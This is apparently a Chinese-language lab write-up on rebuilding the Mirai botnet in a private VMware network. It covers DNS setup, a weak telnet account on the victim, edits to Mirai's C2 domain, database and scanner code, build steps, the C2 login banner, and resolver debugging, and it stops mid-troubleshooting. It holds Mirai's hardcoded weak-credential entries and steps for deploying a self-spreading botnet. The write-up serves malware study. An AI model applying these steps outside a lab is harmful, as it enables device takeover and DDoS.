---
title: 'Mirai 本地复现'
alt: 'Az'
image: ''
summary: ''
created: 2025-05-15
updated: 2024-05-15
tags:
  - 'IoT'
---

## 测试环境搭建

kali CNC: 192.168.59.148 下称 148  
fedora 靶机 1(手动运行 bot)：fedora 192.168.59.150 下称 150  
fedora 靶机 2(作为靶机 1 的感染对象): fedora 192.168.59.129 下称 129  

### 148 提供本地的 DNS 解析

```bash
sudo apt install dnsmasq
vim /etc/dnsmasq.conf
```

```bash
strict-order

# 127.0.0.1 是为了本机自己也能用
# 192.168.59.148 是为了网络中其他机器能访问
listen-address=127.0.0.1,192.168.59.148

address=/cnc.test.me/192.168.59.148
address=/report.test.me/192.168.59.148
# address=/test.me/192.168.59.148

# 优先使用 VMware NAT 网络提供的 DNS
server=192.168.59.2
```

重启服务
`sudo systemctl restart dnsmasq`

还需配置 Kali 系统使用本地 `dnsmasq`
需要让 `/etc/resolv.conf` 指向 `127.0.0.1`
通过 NetworkManager：

```
    - 转到 "IPv4" 标签页。
    - 将 "方法" (Method) 从 "自动 (DHCP)" 改为 "自动 (DHCP) 地址"
    - 在 "DNS 服务器" (DNS servers) 字段中，输入 `127.0.0.1`
```

保存，重启网络服务：`sudo systemctl restart NetworkManager`。

### 靶机的 DNS 设置：

1. **编辑 /etc/hosts 文件：**  

    ```bash
    sudo nano /etc/hosts
    ```

2. **添加条目：**  

    在文件的末尾添加，格式为 IP_Address Hostname :  

    ```bash
    #<ip-address>  <hostname.domain.org>  <hostname>
    127.0.0.1       localhost.localdomain localhost
    ::1             localhost.localdomain localhost
    # ... 其他现有条目 ...

    # 自定义解析 cnc.test.com
    192.168.59.148   cnc.test.me
    192.168.59.148   report.test.me
    ```

3. **验证：**  
    不需要重启任何服务。更改会立即生效。使用 ping 或 dig 来测试：

    ```bash
    ping cnc.test.com
    # PING cnc.test.com (192.168.59.148) 56(84) bytes of data.
    # ...

    # 或者使用 dig
    dig cnc.test.com +short
    # 应该输出 192.168.59.148
    ```

### fedora 129 telnet:
1. **开启 Telnet 服务并设置弱密码：**
    - 安装 Telnet 服务器：sudo dnf install telnet-server telnet
        
    - 启用 Telnet 套接字：sudo systemctl enable telnet.socket
        
    - 启动 Telnet 套接字：sudo systemctl start telnet.socket
        
    - 确保防火墙允许 Telnet 端口 (23)：sudo firewall-cmd --add-service=telnet --permanent 和 sudo firewall-cmd --reload。
        
    - 创建一个用户或修改现有用户密码，使其匹配 Mirai 默认扫描列表中的一个弱密码

新建一个 user 和 passwd 在 mirai 中的用户：
```
    add_auth_entry("\\x43\\x46\\x4F\\x4B\\x4C", "\\x16\\x11\\x10\\x13", 1);                          // admin    1234
    add_auth_entry("\\x43\\x46\\x4F\\x4B\\x4C", "\\x52\\x43\\x51\\x51", 1);                          // admin    pass
    add_auth_entry("\\x43\\x46\\x4F\\x4B\\x4C", "\\x4F\\x47\\x4B\\x4C\\x51\\x4F", 1);                  // admin    meinsm
    add_auth_entry("\\x56\\x47\\x41\\x4A", "\\x56\\x47\\x41\\x4A", 1);                              // tech     tech
    add_auth_entry("\\x4F\\x4D\\x56\\x4A\\x47\\x50", "\\x44\\x57\\x41\\x49\\x47\\x50", 1);              // mother   fucker
```
1. 创建用户 mother：

    ```
    sudo adduser mother
    ```
    这会在系统中创建新用户 mother，并为其创建家目录等。

2. **为用户 mother 设置一个弱密码：**  
    ```
    sudo passwd mother
    ```
3. **检查 Telnet 服务状态：**

    ```
    sudo systemctl status telnet.socket
    netstat -tulnp | grep :23
    ```

    能看到 telnet.socket 处于 active (listening) 状态，并且端口 23 正在被监听。
4. 从 VMware NAT 网络下的另一台机器测试
    在另一台机器的终端中：

    ```
    telnet 192.168.8.129
    ```

### mirai 配置

#### 编译地址异或工具

```
cd mirai/tools/
gcc enc.c -o enc.out

# 生成 XOR 加密的域名

./enc.out string cnc.test.me 并记下结果。
./enc.out string report.test.me 并记下结果。
```

#### 修改 Bot 配置 (mirai/bot/table.c)

`vim ../bot/table.c`

找到 TABLE_CNC_DOMAIN 和 TABLE_SCAN_CB_DOMAIN
将 add_entry 函数的第二个参数（字符串）替换为上一步生成的 cnc.test.me 和 report.test.me 的 XOR 结果。确保反斜杠 \ 和 x 都保留，同时修改长度。

```md
    add_entry(TABLE_CNC_DOMAIN, "\\x41\\x4C\\x41\\x0C\\x56\\x47\\x51\\x56\\x0C\\x4F\\x47\\x22", 12);
    add_entry(TABLE_CNC_PORT, "\\x22\\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\\x50\\x47\\x52\\x4D\\x50\\x56\\x0C\\x56\\x47\\x51\\x56\\x0C\\x4F\\x47\\x22", 15);
    add_entry(TABLE_SCAN_CB_PORT, "\\x99\\xC7", 2);         // 48101

 ```

#### 修改 CNC 配置 (mirai/cnc/main.go)

`vim ../cnc/main.go`

修改 DatabaseAddr 为远程数据库 IP 和端口
修改 DatabaseUser 和 DatabasePass 为远程数据库上创建并授权的 Mirai 用户凭据。
DatabaseTable 应为 mirai

```go
        const DatabaseAddr string   = "REMOTE_DB_IP:3306" // 修改为远程数据库 IP:端口
        const DatabaseUser string   = "mirai-user"        // 修改为远程数据库用户名
        const DatabasePass string   = "mirai-pass"        // 修改为远程数据库密码
        const DatabaseTable string  = "mirai"             // 数据库名，应与 db.sql 创建的一致
```

#### 修改 Bot DNS 解析器 (mirai/bot/resolv.c)

Bot 需要知道向哪个 DNS 服务器查询 CNC 和 Report 域名

`vim ../bot/resolv.c`

找到包含 INET_ADDR 的行 (约第 84 行)。
将其 IP 地址修改为 kali 服务器（也就是 DNS 服务器）的 IP 地址 (192.168.59.148)

```c
        // addr.sin_addr.s_addr = INET_ADDR(8,8,8,8); // 原来的 Google DNS
        addr.sin_addr.s_addr = INET_ADDR(192, 168, 59, 148);
```

### mysql 数据库配置

本来准备使用远程的 sql 数据库，使用 sqlpub 的免费服务，使用初始化 python 脚本进行初始化

但是 sqlhub 必须使用 ssl，所以最后换回使用本机的 mysql 数据库

配置数据库文件，修改 db.sql 文件

```bash
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/mirai/tools# cd ../../scripts/
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/scripts# vim db.sql

CREATE DATABASE mirai;
use mirai;
CREATE TABLE `history` (
```

修改完成之后启动数据库，将 db.sql 文件导入到数据库中
这里我的数据库用户为`root`，密码为`123456`

```bash
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/scripts# service mysql start
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/scripts# cat db.sql | mysql -uroot -p
Enter password: 123456
```

在数据库中添加 mirai 用户，这里账号密码可以随意设置  

用户账号:mirai-user 用户密码:mirai-pass

```bash
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/scripts# mysql -uroot -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.29-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mirai;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
Query OK, 1 row affected (0.00 sec)

mysql> exit
```

重新修改 mirai/cnc/main.go 中的数据库常量

```bash
root@ubuntu:/home/test/Desktop/Mirai-Source-Code/scripts# vim ../mirai/cnc/main.go
将数据库密码修改为当前数据库密码
const DatabaseAddr string   = "127.0.0.1"  //数据库连接地址
const DatabaseUser string   = "root"       //数据库用户
const DatabasePass string   = "123456"     //数据库密码
const DatabaseTable string  = "mirai"      //数据库名
```

### debug 模式启用扫描

由于源码默认在 debug 模式中关闭了 scanner 功能，bot/main.c 中注释后即可运行

```c
#endif

    attack_init();
    killer_init();
// #ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();
#endif
// #endif
```

### 其余代码调整

由于 cnc 启动是在`/debug/cnc`目录下进行的，但是源码里写的是绝对路经。（如下图）

![Pasted image 20250506171610.png](./Pasted%20image%2020250506171610.png)
所以我们把`mirai`目录下的`prompt.txt`移动到`/debug/cnc`下
当然也可以在 admin.go 中将 prompt.txt 的使用注释

```go
    // headerb, err := ioutil.ReadFile("prompt.txt")
    // if err != nil {
    //     return
    // }
```

由于确定扫描的字段，修改为只爆破 192.168：

```cc
static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(192,168,o3,o4); // 写死前两段
}

```

### 编译产物

1. Compile CNC & Bot:

```
cd mirai/
mkdir debug
./build.sh debug telnet
```

1. Compile Loader:

```
cd ../loader/
./build.sh
```

编译 debug 可能遇到报错：`multiple definition of 'LOCAL_ADDR'`

需要：

在头文件 (`bot/includes.h`) 中使用 `extern` 关键字来声明变量，告诉编译器这个变量在别处定义：

```c
        // bot/includes.h //
        ... 其他内容 ...
        extern int LOCAL_ADDR; // 声明变量存在
        // ... 其他内容 ...
```

在 mirai/bot/main.c 中

```c
        `// bot/main.c (或者其他某个 .c 文件)
        #include "includes.h" // 
        ... 其他代码 ...
        ipv4_t LOCAL_ADDR;
```

## 运行 mirai

### 执行之前编译的 cnc

```bash
┌──(root㉿kali)-[/home/kali/my-mirai/Mirai-Source-Code/mirai]
└─# ./debug/cnc
Mysql DB opened
```

检查端口对应的进程

```bash
┌──(root㉿kali)-[~]
└─# netstat -tulpn | grep 23

tcp6       0      0 :::23                   :::*                    LISTEN      711957/./debug/cnc
```

再新开一个终端尝试连接 （可能需要管理员权限）

telnet cnc.test.me 23

得到如下提示后再按一下回车，输入用户名密码登录

```bash
root:/home/test# telnet 192.168.59.148 23
Trying 192.168.59.148...
Connected to 192.168.59.148.
Escape character is '^]'.
**点击回车(注意这里一定手动回车，否则会超时)**

я люблю куриные наггетсы
пользователь: mirai-user
пароль: **********

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
mirai-user@botnet#
```

![3955](./Pasted%20image%2020250508183955.png)
登录成功！

如果连接时报错：

```bash
┌──(root㉿kali)-[/home/kali/my-mirai]
└─# mysql -h 127.0.0.1 -u root -p
Enter password:
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

需要先：

```text
Step 1. `sudo mysql -u root -p`
Step 2. `USE mysql;`
Step 3. `ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'admin';`
# Here 'admin' is your new password, but you can change it.

Step 4. `exit`

如果提示语法错误：
# ALTER USER 'root'@'localhost' IDENTIFIED BY 'admin';
```

然后再：

```bash
sudo service mysql restart
```

### 执行 loader

```bash
cd mirai/debug
sudo ./scanListen

┌──(root㉿kali)-[~]
└─# netstat -lput | grep 48101
tcp6       0      0 [::]:48101              [::]:*                  LISTEN      1041257/./scanListe
```

### 在 150 机器上启动 mirai.dbg

运行 bot 后无法 CNC 上线，始终报错，尝试 5 次后失败

```bash
[scanner] FD61 connected. Trying root:54321
[resolv] Couldn't resolve cnc.test.me in time. 5 tries Resolved cnc.test.me to 0 IPv4 addresses
[main] Failed to resolve CNC address
[scanner] FD64 connection grace[fmualilny]  cCloonsneedc
t[esdc atnon eCrN]C .F DL6o4c allo satd dcroensnse c=tio n-
1908692800
[scanner] FD64 retrying with different auth combo!
```

### 再次确定 DNS 配置

参考：https://blog.niekun.net/archives/1869.html

`/etc/hosts` 文件是 Linux 系统默认的 hosts 文件，一般发起的 DNS 请求会首先查询此 hosts 文件，如果没有匹配上则从 `/etc/resolv.conf` 文件找 DNS 服务器进行进一步查询。

`/etc/resolv.conf` 文件是 linux 系统的默认 dns 配置文件，一般情况下里面定义的域名服务器地址为本地：127.0.0.1 地址，由于 dnsmasq 默认监听本地及局域网 53 端口，则 DNS 请求就会传入 dnsmasq 进行进一步解析。

解析链路：`/etc/hosts` -> `/etc/resolv.conf` -> `dnsmasq`

恢复 kali 的默认 DNS 配置

1. 点击屏幕右上角的网络图标。
2. 选择 "编辑连接..." (Edit Connections...) 或类似的选项。
3. 在弹出的窗口中，找到当前使用的网络连接（通常是 "Wired connection 1"），选中它，然后点击齿轮图标或 "编辑" (Edit)。
4. 切换到 "IPv4 设置" (IPv4 Settings) 标签页。
5. 将 "方法" (Method) 设置回 "自动 (DHCP)" (Automatic (DHCP))。
6. 确保 "DNS 服务器" (DNS servers) 字段是空的，或者显示为灰色不可编辑（表示由 DHCP 提供）。如果里面有 `127.0.0.1`，请删除它。
7. 确保 "忽略从 DHCP 服务器自动获取的 DNS 服务器" (Ignore automatically obtained DNS servers) 或类似的选项**没有**被勾选。
8. 点击 "保存" (Save) 或 "应用" (Apply)。
9. 可能需要断开并重新连接网络，或者重启 NetworkManager 服务 (`sudo systemctl restart NetworkManager`) 来使更改生效。

#### 重新配置 kali DNS

```bash
#/etc/dnsmasq.conf

# 让 dnsmasq 从哪个文件获取上游 DNS 服务器信息 (可选, 如果下面用 server= 指定了就不用太在意这个)
# resolv-file=/etc/resolv.conf # 如果 Kali CNC 自身的 /etc/resolv.conf 配置了可用的上游 DNS

# 严格按照配置文件中 server 指令的顺序使用上游 DNS
strict-order

# dnsmasq 监听的 IP 地址
# 127.0.0.1 是为了本机自己也能用
# 192.168.59.148 是为了网络中其他机器能访问
listen-address=127.0.0.1,192.168.59.148

# 将 cnc.test.me 解析到 Kali CNC 自身
address=/cnc.test.me/192.168.59.148
address=/report.test.me/192.168.59.148
# address=/test.me/192.168.59.148

# 优先使用 VMware NAT 网络提供的 DNS
server=192.168.59.2
```

1. **重启 `dnsmasq` 服务：**

    `sudo systemctl restart dnsmasq sudo systemctl enable dnsmasq # 设置开机自启`

2. **验证 `dnsmasq` 是否在监听 (在 Kali CNC 上)：**

    `sudo ss -tulnp | grep dnsmasq`

由于 kali 使用 NetworkManager，防止其重写 dnsmasq，修改 NetworkManager 一下配置：

`vim /etc/NetworkManager/NetworkManager.conf`

```bash
[main]
dns=dnsmasq
plugins=ifupdown,keyfile

[ifupdown]
managed=false
```

重启 NetworkManager：
`sudo systemctl restart NetworkManager`

修改结果：

```bash
┌──(root㉿kali)-[~]
└─# nslookup cnc.test.me

Server:         127.0.0.1
Address:        127.0.0.1#53

Name:   cnc.test.me
Address: 192.168.59.148
```

#### fedora 靶机

Fedora 通常使用 `NetworkManager`。

- **GUI 方法：** 使用 `nm-connection-editor`，在网络连接中进入 "IPv4 Settings"，将 "Method" 改为 "Automatic (DHCP) addresses only" (如果想通过 DHCP 获取 IP 地址但手动设置 DNS)，或者 "Manual" (如果想手动设置所有 IP 信息)。然后在 "DNS servers" 字段填入 `192.168.59.148`。可以添加一个备用 DNS，如 `192.168.59.2`。

- **命令行方法 (nmcli):**

```bash
# 假设连接名是 "Wired connection 1" 或 "eth0" 
# 先找到连接名: 
nmcli con show CONN_NAME="YourConnectionName" # 替换成连接名 
sudo nmcli con mod "$CONN_NAME" ipv4.dns "192.168.59.148 192.168.59.2" 
sudo nmcli con mod "$CONN_NAME" ipv4.ignore-auto-dns yes # 忽略 DHCP 提供的 DNS 
sudo nmcli con down "$CONN_NAME" && sudo nmcli con up "$CONN_NAME" # 重启连接
```

之后，检查 `/etc/resolv.conf`，它应该由 NetworkManager 更新并指向 `192.168.59.148` (或者如果 `systemd-resolved` 被 NetworkManager 使用，它会指向 `127.0.0.53`，但 `systemd-resolved` 会从 NetworkManager 获取上游 DNS `192.168.59.148`)。

修改后结果：

```bash
bash-5.2$ nslookup cnc.test.me
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	cnc.test.me
Address: 192.168.59.148
```

### 仍然不上线 [resolv] 报错*4

在 150 机器上使用 sudo 启动 mirai.dbg
LOG `[resolv] Got response from select` 重复 4 次，但解析失败

#### 增加详细打印日志

在 `resolv_lookup` 函数中添加尽可能多的 `printf` 语句，打印关键变量的值，例如：

- 发送的 DNS 查询内容（`query` 缓冲区）
- 接收到的响应的原始数据 (在 `recvfrom` 之后)
- `ret`（接收到的字节数）
- `dns_id`
- `ancount`
- `resolv_skip_name` 函数内部的参数和计算结果
- 从响应中解析出的 IP 地址
- 任何错误代码 (`errno`)

```c
void print_hex(const char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    if (len % 16 != 0) printf("\n");
}

struct resolv_entries *resolv_lookup(char *domain) {
  struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
  char query[2048], response[2048];
  struct dnshdr *dnsh = (struct dnshdr *)query;
  char *qname = (char *)(dnsh + 1);

#ifdef DEBUG
  printf("[resolv] Starting lookup for domain: %s\n", domain);
  printf("[resolv] Size of dnshdr: %zu\n", sizeof(struct dnshdr));
  printf("[resolv] Size of dns_question: %zu\n", sizeof(struct dns_question));
  printf("[resolv] Size of dns_resource: %zu\n", sizeof(struct dns_resource));
#endif

  resolv_domain_to_hostname(qname, domain);

  struct dns_question *dnst =
      (struct dns_question *)(qname + util_strlen(qname) + 1);
  struct sockaddr_in addr = {0};
  int query_len = sizeof(struct dnshdr) + util_strlen(qname) + 1 +
                  sizeof(struct dns_question);
  int tries = 0, fd = -1, i = 0;
  uint16_t dns_id = rand_next() % 0xffff;

  util_zero(&addr, sizeof(struct sockaddr_in));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INET_ADDR(192, 168, 59, 148);
  addr.sin_port = htons(53);

  // Set up the dns query
  dnsh->id = dns_id;
  dnsh->opts = htons(1 << 8); // Recursion desired
  dnsh->qdcount = htons(1);
  dnst->qtype = htons(PROTO_DNS_QTYPE_A);
  dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

#ifdef DEBUG
  printf("[resolv] Generated DNS ID: 0x%04x (%u)\n", dns_id, dns_id);
  printf("[resolv] Encoded domain name (qname): ");
  print_hex(qname, util_strlen(qname) + 1); // Print qname including null terminator
  printf("[resolv] Query length: %d\n", query_len);
  printf("[resolv] Raw query packet (first %d bytes):\n", query_len);
  print_hex(query, query_len);
#endif

  while (tries++ < 5) {
    fd_set fdset;
    struct timeval timeo;
    int nfds;

#ifdef DEBUG
    printf("[resolv] Try #%d\n", tries);
#endif

    if (fd != -1)
      close(fd);
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
#ifdef DEBUG
      printf("[resolv] Failed to create socket: %d\n", errno);
#endif
      sleep(1);
      continue;
    }

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) ==
        -1) {
#ifdef DEBUG
      printf("[resolv] Failed to call connect on udp socket: %d\n", errno);
#endif
      sleep(1);
      continue;
    }

#ifdef DEBUG
    printf("[resolv] Sending query...\n");
#endif
    if (send(fd, query, query_len, MSG_NOSIGNAL) == -1) {
#ifdef DEBUG
      printf("[resolv] Failed to send packet: %d\n", errno);
#endif
      sleep(1);
      continue;
    }
#ifdef DEBUG
    printf("[resolv] Query sent. Waiting for response...\n");
#endif
// hello
    fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
    FD_ZERO(&fdset);
    FD_SET(fd, &fdset);

    timeo.tv_sec = 5;
    timeo.tv_usec = 0;
    nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

    if (nfds == -1) {
#ifdef DEBUG
      printf("[resolv] select() failed: %d\n", errno);
#endif
      break; // Exit loop on select error
    } else if (nfds == 0) {
#ifdef DEBUG
      printf("[resolv] Couldn't resolve %s in time (%d sec timeout). %d tr%s\n", domain, (int)timeo.tv_sec, tries,
             tries == 1 ? "y" : "ies");
#endif
      continue; // Try again
    } else if (FD_ISSET(fd, &fdset)) {
#ifdef DEBUG
      printf("[resolv] Got response from select. Attempting to receive...\n");
#endif
      int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
      if (ret == -1) {
#ifdef DEBUG
        perror("[resolv] recvfrom failed");
        printf("[resolv] recvfrom errno: %d\n", errno);
#endif
      }
      char *name;
      // struct dnsans *dnsa; // This variable is unused in the original code
      uint16_t ancount;
      int stop;

#ifdef DEBUG
      printf("[resolv] recvfrom returned: %d bytes\n", ret);
      if (ret > 0) {
          printf("[resolv] Raw response packet (first %d bytes):\n", ret > 64 ? 64 : ret); // Print first 64 bytes or less
          print_hex(response, ret > 64 ? 64 : ret);
      }
#endif

      // Calculate minimum expected response size (header + question)
      // Note: This is a *minimum*. A valid response could be larger.
      // The original check was slightly off, recalculating based on response buffer structure
      int min_response_size = sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question);
#ifdef DEBUG
      printf("[resolv] Minimum expected response size (header + question): %d bytes\n", min_response_size);
#endif

      if (ret < min_response_size) {
#ifdef DEBUG
        printf("[resolv] Received data size (%d) is less than minimum expected size (%d). Skipping.\n", ret, min_response_size);
#endif
        continue; // Data too short
      }

      // Repoint pointers to the response buffer
      dnsh = (struct dnshdr *)response;
      // qname and dnst pointers need to be recalculated relative to the *response* buffer
      // The question section in the response should mirror the query, but let's verify
      char *response_qname = (char *)(dnsh + 1);
      struct dns_question *response_dnst = (struct dns_question *)(response_qname + util_strlen(response_qname) + 1);
      // The answer section starts immediately after the question section
      name = (char *)(response_dnst + 1);

#ifdef DEBUG
      printf("[resolv] Parsing response header...\n");
      printf("[resolv] Sent ID: 0x%04x, Received ID: 0x%04x\n", dns_id, dnsh->id);
#endif
      if (dnsh->id != dns_id) {
#ifdef DEBUG
        printf("[resolv] Response ID mismatch. Expected 0x%04x, got 0x%04x. Skipping.\n", dns_id, dnsh->id);
#endif
        continue; // ID mismatch
      }

      ancount = ntohs(dnsh->ancount);
#ifdef DEBUG
      printf("[resolv] Response ancount (network): 0x%04x, ancount (host): %u\n", dnsh->ancount, ancount);
#endif

      if (ancount == 0) {
#ifdef DEBUG
        printf("[resolv] ancount is 0. No answer records found. Skipping.\n");
#endif
        continue; // No answer records
      }

      // Check if ancount is excessively large, which might indicate corruption
      // A rough check: ancount * min_resource_size should not exceed remaining buffer
      int remaining_buffer = ret - (name - response);
      int min_resource_size_estimate = sizeof(struct dns_resource) + 4; // RDATA for A record is 4 bytes
      if (ancount > remaining_buffer / min_resource_size_estimate && remaining_buffer > min_resource_size_estimate) {
#ifdef DEBUG
           printf("[resolv] Warning: ancount (%u) seems excessively large for remaining buffer (%d bytes). Potential parsing issue.\n", ancount, remaining_buffer);
           // Decide whether to continue or skip based on severity. For now, let's continue but log the warning.
      } else if (ancount > 100) { // Arbitrary large number check
           printf("[resolv] Warning: ancount (%u) is very large. Potential parsing issue.\n", ancount);
      }
#endif

      int parsed_records = 0;
      // Loop through answer records
      while (ancount-- > 0) {
        struct dns_resource *r_data = NULL;
        int current_offset = name - response; // Offset from start of response buffer

#ifdef DEBUG
        printf("[resolv] Parsing Answer Record #%d (ancount remaining: %u). Current offset: %d (0x%x)\n", parsed_records + 1, ancount + 1, current_offset, current_offset);
        printf("[resolv] Calling resolv_skip_name for resource name at offset %d...\n", current_offset);
#endif
        resolv_skip_name(name, response, &stop);
#ifdef DEBUG
        printf("[resolv] resolv_skip_name returned stop: %d. New offset after name: %d (0x%x)\n", stop, current_offset + stop, current_offset + stop);
#endif
        name = name + stop;
        current_offset = name - response; // Update offset

        // Check if we are still within the received buffer bounds before accessing r_data
        if (current_offset + sizeof(struct dns_resource) > ret) {
#ifdef DEBUG
            printf("[resolv] Error: Attempting to read dns_resource header outside buffer bounds. Remaining buffer: %d, need: %zu. Breaking loop.\n", ret - current_offset, sizeof(struct dns_resource));
            break; // Prevent reading out of bounds
        }
#endif
        r_data = (struct dns_resource *)name;
#ifdef DEBUG
        printf("[resolv] Resource Type (network): 0x%04x, (host): %u\n", r_data->type, ntohs(r_data->type));
        printf("[resolv] Resource Class (network): 0x%04x, (host): %u\n", r_data->_class, ntohs(r_data->_class));
        printf("[resolv] Resource TTL: %u\n", ntohl(r_data->ttl));
        printf("[resolv] Resource Data Length (network): 0x%04x, (host): %u\n", r_data->data_len, ntohs(r_data->data_len));
#endif

        name = name + sizeof(struct dns_resource);
        current_offset = name - response; // Update offset after resource header

        uint16_t data_len = ntohs(r_data->data_len);

        // Check if RDATA length is valid and within buffer bounds
        if (current_offset + data_len > ret) {
#ifdef DEBUG
            printf("[resolv] Error: Attempting to read RDATA outside buffer bounds. Remaining buffer: %d, RDATA length: %u. Breaking loop.\n", ret - current_offset, data_len);
            break; // Prevent reading out of bounds
        }
#endif

        if (r_data->type == htons(PROTO_DNS_QTYPE_A) &&
            r_data->_class == htons(PROTO_DNS_QCLASS_IP)) {
          if (data_len == 4) {
            uint32_t *p;
            uint8_t tmp_buf[4];
            // Copy the 4 bytes to a temporary buffer to avoid alignment issues
            for (i = 0; i < 4; i++)
              tmp_buf[i] = name[i];

            p = (uint32_t *)tmp_buf;

            entries->addrs = realloc(entries->addrs,
                                     (entries->addrs_len + 1) * sizeof(ipv4_t));
            if (entries->addrs == NULL) {
#ifdef DEBUG
                printf("[resolv] realloc failed!\n");
#endif
                // Handle realloc failure - free entries and return NULL?
                // For now, let's just break the loop and return what we have.
                break;
            }
            entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
            // Print IP in hex and dotted decimal (if inet_ntoa is available/suitable)
            struct in_addr ip_addr;
            ip_addr.s_addr = *p; // IP is already in network byte order from the packet
            printf("[resolv] Found IPv4 address: 0x%08x (%s)\n", ntohl(*p), inet_ntoa(ip_addr)); // ntohl for printing hex in host order
#endif
          } else {
#ifdef DEBUG
              printf("[resolv] Found A record with unexpected data length: %u (expected 4). Skipping RDATA.\n", data_len);
#endif
          }

          // Advance name pointer past RDATA
          name = name + data_len;
        } else {
          // Not an A record (or not IN class), skip its RDATA
#ifdef DEBUG
          printf("[resolv] Skipping non-A/IN record (Type: %u, Class: %u). RDATA length: %u. Current offset before skipping RDATA: %d.\n",
                 ntohs(r_data->type), ntohs(r_data->_class), data_len, current_offset);
#endif
          // The original code seems to call resolv_skip_name again here, which is incorrect
          // for skipping RDATA. RDATA length is given by r_data->data_len.
          // Let's correct this logic based on standard DNS parsing.
          // We should just advance the pointer by data_len.
          name = name + data_len;

#ifdef DEBUG
          printf("[resolv] Advanced name pointer by RDATA length %u. New offset: %d (0x%x)\n", data_len, name - response, name - response);
#endif
        }
        parsed_records++;
      } // End while (ancount-- > 0) loop

      // If we found any addresses, we are done with this domain
      if (entries->addrs_len > 0) {
#ifdef DEBUG
          printf("[resolv] Successfully parsed %d IPv4 addresses.\n", entries->addrs_len);
#endif
          break; // Exit tries loop
      } else {
#ifdef DEBUG
          printf("[resolv] Finished parsing records, but found no IPv4 addresses. Trying again...\n");
#endif
          // Continue the tries loop if no addresses were found but response was received
      }
    } // End if (FD_ISSET)
  } // End while (tries)

  if (fd != -1) {
#ifdef DEBUG
      printf("[resolv] Closing socket fd: %d\n", fd);
#endif
      close(fd);
  }

#ifdef DEBUG
  printf("[resolv] Lookup for %s finished. Found %d IPv4 addresses.\n", domain, entries->addrs_len);
#endif

  if (entries->addrs_len > 0)
    return entries;
  else {
    resolv_entries_free(entries);
    return NULL;
  }
}
```

根据更详细的日志来判断：

```bash
[resolv] Got response from select. Attempting to receive...
[resolv] recvfrom returned: -1 bytes
[resolv] Minimum expected response size (header + question): 29 bytes
[resolv] Received data size (-1) is less than minimum expected size (29). Skipping.
```

**`recvfrom` 函数调用失败，返回值为 -1。**
通过打印**`errno`**的值：

```bash
[resolv] Got response from select. Attempting to receive...
[resolv] recvfrom failed: Connection refused
[resolv] recvfrom errno: 111
```

`errno` 值为 `111` 在 Linux 系统上对应的是 `ECONNREFUSED`

但是事实上使用 **`nslookup cnc.test.me 192.168.59.148`** 没问题：

```bash
bash-5.2$ nslookup cnc.test.me 192.168.59.148
Server:		192.168.59.148
Address:	192.168.59.148#53

Name:	cnc.test.me
Address: 192.168.59.148
```

将 reslov 的 dns 解析确定到 148：
